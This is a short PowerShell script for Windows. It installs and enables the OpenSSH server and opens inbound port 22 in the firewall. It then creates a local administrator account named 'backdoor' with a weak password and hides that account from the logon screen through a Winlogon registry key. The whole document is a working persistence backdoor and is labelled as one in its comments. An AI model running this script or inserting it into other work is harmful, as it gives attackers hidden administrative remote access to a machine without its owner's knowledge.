# Install OpenSSH Server
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# Make backdoor user
$backdoorUser = "backdoor"
$passwd = "pass"
net user /add $backdoorUser $passwd
net localgroup Administrators $backdoorUser /add

# Hide backdoorUser
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

if (-not (Test-Path $regPath)) {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force | Out-Null
    New-Item -Path $regPath -Force | Out-Null
}

New-ItemProperty -Path $regPath -Name $backdoorUser -PropertyType DWord -Value 0 -Force
